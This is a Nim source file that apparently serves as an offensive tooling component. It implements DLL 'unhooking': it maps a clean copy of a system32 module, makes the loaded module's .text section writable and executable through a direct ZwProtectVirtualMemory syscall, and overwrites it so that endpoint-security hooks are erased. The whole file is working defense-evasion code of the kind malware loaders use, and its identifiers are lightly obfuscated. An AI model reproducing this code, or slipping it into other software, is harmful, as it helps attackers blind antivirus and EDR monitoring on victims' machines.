import strutils, ptr_math
import nimvoke/syscalls 
import nimvoke/dinvoke 
from winim import NTSTATUS, NT_SUCCESS, LPVOID, HANDLE, MODULEINFO, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, PIMAGE_SECTION_HEADER, LPMODULEINFO, WINBOOL, LPCWSTR, LPCSTR, SEC_IMAGE, 
                  PAGE_READONLY, PVOID, PSIZE_T, NULL, FILE_MAP_READ, DWORD_PTR, DWORD, SIZE_T, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, LPSECURITY_ATTRIBUTES, HMODULE, 
                  `&`, CloseHandle, FreeLibrary, GetModuleHandleA, GetModuleInformation
import strformat 

dinvokeDefine(CreateFileMappingA, "kernel32.dll", proc (hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCSTR): HANDLE {.stdcall.})
dinvokeDefine(MapViewOfFile, "kernel32.dll", proc (hFileMappingObject: HANDLE, dwDesiredAccess: DWORD, dwFileOffsetHigh: DWORD, dwFileOffsetLow: DWORD, dwNumberOfBytesToMap: SIZE_T): LPVOID {.stdcall.})

proc toString(bytes: openarray[byte]): string = 
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
   
proc uhkModule*(module: string): bool =
  var 
    mi: MODULEINFO 
    base: LPVOID 
    hFile: FileHandle
    status: NTSTATUS 
    hMapping: HANDLE 
    freshBase: LPVOID 
    hkedDOSHeader: PIMAGE_DOS_HEADER 
    hkedNTHeader: PIMAGE_NT_HEADERS
    hkedSectionHeader: PIMAGE_SECTION_HEADER 
    hModule = GetModuleHandleA(module)
    hProc: HANDLE = 0xFFFFFFFFFFFFFFFF
  
  GetModuleInformation(hProc, hModule, addr mi, cast[DWORD](sizeof(mi)))
  base = mi.lpBaseOfDll

  let path = fmt"C:\\windows\\system32\\{module}"
  hFile = getOsFileHandle(open(path, fmRead))
  hMapping = CreateFileMappingA(hFile, NULL, 16777218, 0, 0, NULL)  # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if hMapping == 0:
    CloseHandle(hFile)
    FreeLibrary(hModule)
    return false 

  freshBase = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)
  if freshBase.isNil:
    CloseHandle(hMapping)
    CloseHandle(hFile)
    FreeLibrary(hModule)
    return false 

  hkedDOSHeader = cast[PIMAGE_DOS_HEADER](base)
  hkedNTHeader  = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](base) + hkedDOSHeader.e_lfanew)

  let low: uint16 = 0
  for Section in low ..< hkedNTHeader.FileHeader.NumberOfSections:
    hkedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hkedNTHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))

    if ".text" in toString(hkedSectionHeader.Name):
      var 
        regionSize: SIZE_T = hkedSectionHeader.Misc.VirtualSize 
        pHkTxtSection: PVOID = base + hkedSectionHeader.VirtualAddress 
        pCleanTxtSection: PVOID = freshBase + hkedSectionHeader.VirtualAddress 

      var oldProtect: DWORD = 0
      status = syscall(ZwProtectVirtualMemory, hProc, &pHkTxtSection, &regionSize, 0x40, &oldProtect)
      if not NT_SUCCESS(status):
        return false 
      
      copyMem(pHkTxtSection, pCleanTxtSection, regionSize)

      status = syscall(ZwProtectVirtualMemory, hProc, &pHkTxtSection, &regionSize, oldProtect, &oldProtect)
      if not NT_SUCCESS(status):
        return false 

  CloseHandle(hProc)
  CloseHandle(hFile)
  CloseHandle(hMapping)
  FreeLibrary(hModule)
  return true 